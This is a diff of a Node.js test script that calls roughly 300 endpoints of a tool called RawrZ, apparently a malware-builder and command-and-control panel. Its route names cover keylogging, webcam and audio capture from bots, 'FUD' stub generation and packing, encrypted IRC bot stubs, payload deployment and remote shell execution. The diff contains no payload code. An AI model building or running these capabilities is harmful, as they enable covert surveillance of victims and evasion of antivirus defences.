@@ -1,4 +1,4 @@
-// Comprehensive Test for ALL 292 RawrZ Endpoints
+// Comprehensive Test for ALL 300 RawrZ Endpoints
 const http = require('http');
 
 class ComprehensiveEndpointTester {
@@ -87,17 +87,17 @@ class ComprehensiveEndpointTester {
     }
 
     async runAllTests() {
-        console.log('🚀 Starting Comprehensive Test of ALL 292 RawrZ Endpoints...\n');
+        console.log('🚀 Starting Comprehensive Test of ALL 300 RawrZ Endpoints...\n');
         console.log('='.repeat(80));
 
         // Test API Endpoints (15 endpoints)
         console.log('\n📋 TESTING API ENDPOINTS');
         console.log('-'.repeat(40));
+        await this.testEndpoint('GET', '/api/health', 'api health', 200, null);
         await this.testEndpoint('GET', '/api/status', 'api status', 200, null);
         await this.testEndpoint('GET', '/api/algorithms', 'api algorithms', 200, null);
         await this.testEndpoint('GET', '/api/engines', 'api engines', 200, null);
         await this.testEndpoint('GET', '/api/features', 'api features', 200, null);
-        await this.testEndpoint('GET', '/api/health', 'api health', 200, null);
         await this.testEndpoint('GET', '/api/compile/languages', 'api compile languages', 200, null);
         await this.testEndpoint('GET', '/api/compile/targets', 'api compile targets', 200, null);
         await this.testEndpoint('GET', '/api/dashboard/stats', 'api dashboard stats', 200, null);
@@ -125,7 +125,7 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('GET', '/health', 'health', 200, null);
         await this.testEndpoint('GET', '/', '', 200, null);
 
-        // Test Bot Generation (66 endpoints)
+        // Test Bot Generation (68 endpoints)
         console.log('\n📋 TESTING BOT GENERATION');
         console.log('-'.repeat(40));
         await this.testEndpoint('GET', '/api/bots/languages', 'api bots languages', 200, null);
@@ -172,9 +172,6 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('POST', '/http-bot/keylog/:botId', 'http bot keylog  botId', 200, {});
         await this.testEndpoint('POST', '/http-bot/webcam/:botId', 'http bot webcam  botId', 200, {});
         await this.testEndpoint('POST', '/http-bot/audio/:botId', 'http bot audio  botId', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/generate', 'stub generator generate', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/regenerate', 'stub generator regenerate', 200, {});
-        await this.testEndpoint('POST', '/native-compiler/regenerate', 'native compiler regenerate', 200, {});
         await this.testEndpoint('POST', '/irc-bot/generate-stub', 'irc bot generate stub', 200, {});
         await this.testEndpoint('POST', '/irc-bot/encrypt-stub', 'irc bot encrypt stub', 200, {});
         await this.testEndpoint('POST', '/irc-bot/save-encrypted-stub', 'irc bot save encrypted stub', 200, {});
@@ -190,7 +187,12 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('POST', '/barcode-generate', 'barcode generate', 200, {});
         await this.testEndpoint('POST', '/ev-cert/generate', 'ev cert generate', 200, {});
         await this.testEndpoint('POST', '/beaconism/generate-payload', 'beaconism generate payload', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/generate', 'stub generator generate', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/regenerate', 'stub generator regenerate', 200, {});
+        await this.testEndpoint('POST', '/native-compiler/regenerate', 'native compiler regenerate', 200, {});
         await this.testEndpoint('PUT', '/irc-bot/custom-features/update/:featureName', 'irc bot custom features update  featureName', 200, {});
+        await this.testEndpoint('DELETE', '/irc-bot/custom-features/remove/:featureName', 'irc bot custom features remove  featureName', 200, null);
+        await this.testEndpoint('DELETE', '/irc-bot/feature-templates/:templateName', 'irc bot feature templates  templateName', 200, null);
         await this.testEndpoint('DELETE', '/stub-generator/:botId', 'stub generator  botId', 200, null);
         await this.testEndpoint('DELETE', '/irc-bot/custom-features/remove/:featureName', 'irc bot custom features remove  featureName', 200, null);
         await this.testEndpoint('DELETE', '/irc-bot/feature-templates/:templateName', 'irc bot feature templates  templateName', 200, null);
@@ -212,9 +214,16 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('POST', '/api/analysis/digital-forensics', 'api analysis digital forensics', 200, {});
         await this.testEndpoint('POST', '/api/analysis/network', 'api analysis network', 200, {});
         await this.testEndpoint('POST', '/api/analysis/reverse-engineering', 'api analysis reverse engineering', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/analyze', 'stub generator analyze', 200, {});
         await this.testEndpoint('POST', '/analyze', 'analyze', 200, {});
         await this.testEndpoint('POST', '/portscan', 'portscan', 200, {});
+        await this.testEndpoint('POST', '/mobile-scan', 'mobile scan', 200, {});
+        await this.testEndpoint('POST', '/forensics-scan', 'forensics scan', 200, {});
+        await this.testEndpoint('POST', '/network-scan', 'network scan', 200, {});
+        await this.testEndpoint('POST', '/vulnerability-scan', 'vulnerability scan', 200, {});
+        await this.testEndpoint('POST', '/security-scan', 'security scan', 200, {});
+        await this.testEndpoint('POST', '/malware-scan', 'malware scan', 200, {});
+        await this.testEndpoint('POST', '/beaconism/scan-target', 'beaconism scan target', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/analyze', 'stub generator analyze', 200, {});
         await this.testEndpoint('POST', '/jotti/scan', 'jotti scan', 200, {});
         await this.testEndpoint('POST', '/jotti/scan-multiple', 'jotti scan multiple', 200, {});
         await this.testEndpoint('POST', '/jotti/cancel-scan', 'jotti cancel scan', 200, {});
@@ -223,13 +232,6 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('POST', '/private-scanner/cancel/:scanId', 'private scanner cancel  scanId', 200, {});
         await this.testEndpoint('POST', '/private-scanner/clear-queue', 'private scanner clear queue', 200, {});
         await this.testEndpoint('POST', '/private-scanner/queue-settings', 'private scanner queue settings', 200, {});
-        await this.testEndpoint('POST', '/mobile-scan', 'mobile scan', 200, {});
-        await this.testEndpoint('POST', '/forensics-scan', 'forensics scan', 200, {});
-        await this.testEndpoint('POST', '/network-scan', 'network scan', 200, {});
-        await this.testEndpoint('POST', '/vulnerability-scan', 'vulnerability scan', 200, {});
-        await this.testEndpoint('POST', '/security-scan', 'security scan', 200, {});
-        await this.testEndpoint('POST', '/malware-scan', 'malware scan', 200, {});
-        await this.testEndpoint('POST', '/beaconism/scan-target', 'beaconism scan target', 200, {});
 
         // Test Security (6 endpoints)
         console.log('\n📋 TESTING SECURITY');
@@ -279,31 +281,16 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('POST', '/timeline-analysis', 'timeline analysis', 200, {});
         await this.testEndpoint('POST', '/random-math', 'random math', 200, {});
 
-        // Test Other (139 endpoints)
+        // Test Other (145 endpoints)
         console.log('\n📋 TESTING OTHER');
         console.log('-'.repeat(40));
         await this.testEndpoint('GET', '/unified', 'unified', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/status', 'stub generator status', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/templates', 'stub generator templates', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/active', 'stub generator active', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/packing-methods', 'stub generator packing methods', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/fud-techniques', 'stub generator fud techniques', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/auto-regeneration/status', 'stub generator auto regeneration status', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/unpacked', 'stub generator unpacked', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/repack-history', 'stub generator repack history', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/comprehensive-stats', 'stub generator comprehensive stats', 200, null);
-        await this.testEndpoint('GET', '/stub-generator/export-stats/:format', 'stub generator export stats  format', 200, null);
-        await this.testEndpoint('GET', '/native-compiler/stats', 'native compiler stats', 200, null);
-        await this.testEndpoint('GET', '/native-compiler/supported-languages', 'native compiler supported languages', 200, null);
-        await this.testEndpoint('GET', '/native-compiler/available-compilers', 'native compiler available compilers', 200, null);
         await this.testEndpoint('GET', '/files', 'files', 200, null);
         await this.testEndpoint('GET', '/download', 'download', 200, null);
         await this.testEndpoint('GET', '/sysinfo', 'sysinfo', 200, null);
         await this.testEndpoint('GET', '/processes', 'processes', 200, null);
         await this.testEndpoint('GET', '/mutex/options', 'mutex options', 200, null);
         await this.testEndpoint('GET', '/upx/methods', 'upx methods', 200, null);
-        await this.testEndpoint('GET', '/jotti/info', 'jotti info', 200, null);
-        await this.testEndpoint('GET', '/jotti/test-connection', 'jotti test connection', 200, null);
         await this.testEndpoint('GET', '/api-status', 'api status', 200, null);
         await this.testEndpoint('GET', '/performance-monitor', 'performance monitor', 200, null);
         await this.testEndpoint('GET', '/memory-info', 'memory info', 200, null);
@@ -339,14 +326,26 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('GET', '/red-shells/:id/history', 'red shells  id history', 200, null);
         await this.testEndpoint('GET', '/red-shells/stats', 'red shells stats', 200, null);
         await this.testEndpoint('GET', '/advanced-features', 'advanced features', 200, null);
-        await this.testEndpoint('POST', '/stub-generator/auto-regeneration/enable', 'stub generator auto regeneration enable', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/auto-regeneration/disable', 'stub generator auto regeneration disable', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/trigger-regeneration', 'stub generator trigger regeneration', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/process-scheduled', 'stub generator process scheduled', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/unpack', 'stub generator unpack', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/repack', 'stub generator repack', 200, {});
-        await this.testEndpoint('POST', '/stub-generator/reset-stats', 'stub generator reset stats', 200, {});
-        await this.testEndpoint('POST', '/native-compiler/compile', 'native compiler compile', 200, {});
+        await this.testEndpoint('GET', '/stub-generator/status', 'stub generator status', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/templates', 'stub generator templates', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/active', 'stub generator active', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/packing-methods', 'stub generator packing methods', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/fud-techniques', 'stub generator fud techniques', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/auto-regeneration/status', 'stub generator auto regeneration status', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/unpacked', 'stub generator unpacked', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/repack-history', 'stub generator repack history', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/comprehensive-stats', 'stub generator comprehensive stats', 200, null);
+        await this.testEndpoint('GET', '/stub-generator/export-stats/:format', 'stub generator export stats  format', 200, null);
+        await this.testEndpoint('GET', '/native-compiler/stats', 'native compiler stats', 200, null);
+        await this.testEndpoint('GET', '/native-compiler/supported-languages', 'native compiler supported languages', 200, null);
+        await this.testEndpoint('GET', '/native-compiler/available-compilers', 'native compiler available compilers', 200, null);
+        await this.testEndpoint('GET', '/jotti/info', 'jotti info', 200, null);
+        await this.testEndpoint('GET', '/jotti/test-connection', 'jotti test connection', 200, null);
+        await this.testEndpoint('GET', '/implementation-check/results', 'implementation check results', 200, null);
+        await this.testEndpoint('GET', '/implementation-check/modules', 'implementation check modules', 200, null);
+        await this.testEndpoint('GET', '/beaconism/status', 'beaconism status', 200, null);
+        await this.testEndpoint('GET', '/beaconism/payloads', 'beaconism payloads', 200, null);
+        await this.testEndpoint('GET', '/beaconism/targets', 'beaconism targets', 200, null);
         await this.testEndpoint('POST', '/upload', 'upload', 200, {});
         await this.testEndpoint('POST', '/cli', 'cli', 200, {});
         await this.testEndpoint('POST', '/stub', 'stub', 200, {});
@@ -417,6 +416,15 @@ class ComprehensiveEndpointTester {
         await this.testEndpoint('POST', '/beaconism/deploy', 'beaconism deploy', 200, {});
         await this.testEndpoint('POST', '/red-shells/create', 'red shells create', 200, {});
         await this.testEndpoint('POST', '/red-shells/:id/execute', 'red shells  id execute', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/trigger-regeneration', 'stub generator trigger regeneration', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/unpack', 'stub generator unpack', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/repack', 'stub generator repack', 200, {});
+        await this.testEndpoint('POST', '/native-compiler/compile', 'native compiler compile', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/auto-regeneration/enable', 'stub generator auto regeneration enable', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/auto-regeneration/disable', 'stub generator auto regeneration disable', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/process-scheduled', 'stub generator process scheduled', 200, {});
+        await this.testEndpoint('POST', '/stub-generator/reset-stats', 'stub generator reset stats', 200, {});
+        await this.testEndpoint('DELETE', '/red-shells/:id', 'red shells  id', 200, null);
         await this.testEndpoint('DELETE', '/stub-generator/clear/all', 'stub generator clear all', 200, null);
         await this.testEndpoint('DELETE', '/stub-generator/unpacked/:unpackId', 'stub generator unpacked  unpackId', 200, null);
         await this.testEndpoint('DELETE', '/stub-generator/unpacked/clear/all', 'stub generator unpacked clear all', 200, null);
